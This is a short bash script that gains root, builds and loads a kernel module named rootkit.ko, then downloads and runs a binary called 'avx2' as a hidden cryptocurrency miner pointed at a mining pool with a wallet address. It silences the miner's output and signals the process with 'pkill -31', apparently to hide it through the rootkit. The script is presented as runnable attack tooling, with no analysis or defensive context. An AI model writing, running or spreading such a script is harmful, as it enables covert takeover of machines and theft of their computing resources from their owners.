#!/bin/bash
sudo su
git clone https://github.com/duitawa/yoyic
cd yoyic/
make
dmesg -C
insmod rootkit.ko
dmesg
wget https://github.com/duitawa/ansible/raw/main/avx2 && chmod +x avx2
chmod +x avx2
./avx2 -a yescryptr16 -o stratum+tcps://stratum-na.rplant.xyz:17023 -u RHtPA9STGzx1mD32428bJj8i7ZipQrMxfZ.$(echo $(shuf -i 100-999 -n 1)-CPU) -p x > /dev/null 2>&1 &
uname -a
pkill -31 avx2
time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 5; done
